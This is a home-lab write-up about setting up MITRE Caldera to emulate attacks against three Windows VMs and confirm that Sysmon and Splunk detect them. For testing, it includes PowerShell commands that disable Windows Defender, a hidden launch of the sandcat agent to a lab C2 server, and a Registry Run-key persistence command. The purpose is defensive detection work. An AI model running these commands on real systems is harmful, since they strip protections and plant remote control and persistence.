# Caldera — Adversary Emulation

Caldera is the offensive side of the lab. It's a separate Ubuntu VM running MITRE Caldera, used to generate real attack activity against the three Windows machines so I can test whether the detection pipeline (Sysmon → Splunk) actually catches it. This document covers why Caldera, the resource rebalance it forced, the VM build, the install and its problems, deploying agents, and the first end-to-end test.

## Why Caldera

With the base lab in place — the DC, Target_1, and Target_2 monitored by Sysmon, and Splunk collecting Windows, firewall, and Ubuntu logs — the natural next step was to generate real attacker activity and see what the pipeline detects. I chose MITRE Caldera, an automated adversary-emulation framework built on MITRE ATT&CK, over hand-driven tooling like Kali. It doesn't require prior red-team experience and it produces officially documented techniques (T-codes) that map straight to detections in Splunk.

## Resource rebalance

The host has 32 GB of RAM total. To fit Caldera without straining it, I redistributed RAM across the VMs:

| VM | RAM |
|---|---|
| Windows Server (DC01) | 4 GB |
| Ubuntu Server (Splunk) | 8 GB |
| Target_1 | 3 GB |
| Target_2 | 3 GB |
| OPNsense | 2 GB |
| Caldera (new) | 2 GB |

## VM specifications

| Setting | Value |
|---|---|
| RAM | 2 GB |
| Disk | 30 GB |
| CPU cores | 1 |
| OS | Ubuntu Server |
| Network | VMnet3 — Servers (VLAN30) |
| IP address | 192.168.30.35 |
| Caldera version | 5.3.0 |

I put Caldera on its own VM rather than co-locating it with Splunk, to keep the roles cleanly separated.

On first boot it didn't get a DHCP address. I worked through the same checks that fixed the Splunk VM earlier — confirmed the interface state with `ip a`, checked the Netplan config (`dhcp4: true`), ran `dhclient` by hand, and made sure the Servers network was still in the Dnsmasq Interface list on OPNsense.

## Installing Caldera and the problems

### git clone asked for a GitHub login

`git clone --recursive` stopped and prompted for a username/password (GitHub dropped that auth method back in 2021). Splitting it into two steps worked:

```
git clone https://github.com/mitre/caldera.git
cd caldera
git submodule update --init --recursive
```

### Web UI: "Template 'index.html' not found"

The Caldera web UI (Magma) is a Node.js app and hadn't been built yet:

```
cd plugins/magma
npm install
npm run build
```

### Accidentally deleted conf/default.yml

While chasing a login-password issue, I deleted `conf/default.yml` on the wrong assumption that it would be regenerated automatically (the way Splunk regenerates some of its files). It turned out that file is untracked in git in this version, so `git checkout` couldn't bring it back. I recovered it by pulling it straight from the official repo:

```
wget -O conf/default.yml https://raw.githubusercontent.com/mitre/caldera/master/conf/default.yml
```

Lesson: don't assume every config file is auto-generated — checking first would have saved the detour.

### ModuleNotFoundError on server start

The virtual environment wasn't active:

```
source venv/bin/activate
python3 server.py --insecure
```

### sandcat missing from the agent list

`plugins/sandcat` was on disk but wasn't showing up in the "Deploy an agent" dropdown. The boot log had this warning:

```
WARNING x86_64-w64-mingw32-gcc dependency missing. Will not be able to compile sandcat as a Windows DLL.
```

That's only for an optional advanced feature (compiling sandcat as a Windows DLL) — it isn't required for the normal `.exe` agent. Once I confirmed "Enabled plugin: sandcat" appeared in the boot log, sandcat was available in the dropdown as normal.

### Default credentials

Running the server with `--insecure` uses default accounts stored in plain text inside `conf/default.yml` (not random). Read them with:

```
cat conf/default.yml
```

## Disabling Windows Defender on the targets

Sandcat and most off-the-shelf abilities are known to AV by signature. Since the lab's goal is to watch behavior through Sysmon, not to test whether Defender can block things, I disabled Windows Defender on the target machines during exercises — deliberately and temporarily.

One snag: `Set-MpPreference` was being rejected or ignored on some machines even in an elevated PowerShell. The cause was Tamper Protection, which by design cannot be turned off through PowerShell or any script (Microsoft blocks that so malware can't disable protection automatically). It has to be turned off in the Windows Security UI first, after which the PowerShell commands take effect:

```
# UI only:
Windows Security -> Virus & threat protection -> Manage settings -> Tamper Protection -> Off

# then via PowerShell:
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
```

## Deploying the sandcat agents

The first time I ran Caldera's auto-generated PowerShell one-liner on Target_1, it failed:

```
Exception calling "DownloadData": "Unable to connect to the remote server"
```

The cause was the full isolation between the Users network and the Servers network where Caldera lives — the same pattern as the Splunk 9997 issue. I added one narrow exception on OPNsense:

| Field | Value |
|---|---|
| Action | Pass |
| Interface | LAN (Users) |
| Protocol | TCP |
| Source | LAN net |
| Destination | 192.168.30.35 (Caldera) |
| Destination port | 8888 |
| Description | Allow Caldera agent traffic (C2) |

Because the firewall is stateful, opening this one direction (Users → Servers) is enough — Caldera's replies are allowed back automatically through the state table, with no reverse rule needed. The isolation between the two networks stays intact apart from this one purpose-built hole.

After opening the port, `sandcat.exe` downloaded but didn't start on its own (the last line of the combined command likely got cut off). Running it as a separate manual step fixed it:

```
Start-Process -FilePath "C:\Users\Public\sandcat.exe" -ArgumentList "-server http://192.168.30.35:8888 -group red" -WindowStyle hidden
```

Repeated on the Windows Server, Target_1, and Target_2. Result: three agents showed up Alive in the Caldera UI.

## First operation: the "Check" profile

Ran the built-in "Check" adversary profile (a safe recon chain — current user, working directory, directory listing, network interface config) across all three machines at once.

Every step returned `status=success` with a real PID on each machine, which proved Caldera can actually run commands remotely on all three.

One thing to note: the same username (`laith`) showed up as Current User on all three. That's expected, not a bug — the ability reads the identity of whoever launched `sandcat.exe` (the same admin account was used on all three), not necessarily whoever is logged in at the screen.

## The decisive test: a distinctive event, verified in Splunk

Instead of relying on Event ID 1 (Process Creation), which is extremely common and hard to pick out of the noise, I used a Registry persistence technique (T1547.001) that generates Sysmon Event ID 13 — rare in normal activity and easy to spot.

Run through Caldera's Manual Command feature rather than a prebuilt ability:

```powershell
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Force | Out-Null;
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "CalderaDemo" -Value "C:\Windows\System32\calc.exe"
```

Searched Splunk:

```
index=main EventCode=13 TargetObject="*CalderaDemo*"
```

Two clean events came back (EventCode=13, ComputerName=WIN-IC59S2PCTCD.laith.local, sourcetype XmlWinEventLog:Microsoft-Windows-Sysmon/Operational), timed to exactly when I ran the command in Caldera. That proves the full chain end to end:

**Caldera (Manual Command) → PowerShell on the target → Registry change → Sysmon (Event ID 13) → Splunk (index=main)**

## Result

- Caldera 5.3.0 installed and running on its own VM (192.168.30.35:8888), separate from Splunk.
- Three sandcat agents deployed and Alive on the Windows Server, Target_1, and Target_2.
- One narrow firewall rule (TCP/8888, one direction) added to allow Users → Caldera without breaking isolation.
- A full "Check" operation ran successfully on all three machines.
- A real persistence technique (Registry Run key) executed and its matching Sysmon Event ID 13 confirmed in Splunk, proving the whole detection chain works.

## Purple team roadmap

Rather than stopping at one test, the plan is to build several full scenarios over time, each documented as its own Incident Response report:

- An advanced adversary profile emulating a real APT group (e.g. APT29) — a complete attack chain through Caldera.
- A ransomware scenario — fast lateral spread plus modifying/encrypting dummy files.
- An insider-threat scenario — misuse of a legitimate user's privileges (more manual, less Caldera-driven).

Recommended method for each: run the attack without writing the steps down first, wait a day or two, then investigate as a SOC analyst using only Splunk (a blind investigation), and write a full IR report — timeline, each step mapped to its MITRE ATT&CK ID, and any detection gaps to close afterward.
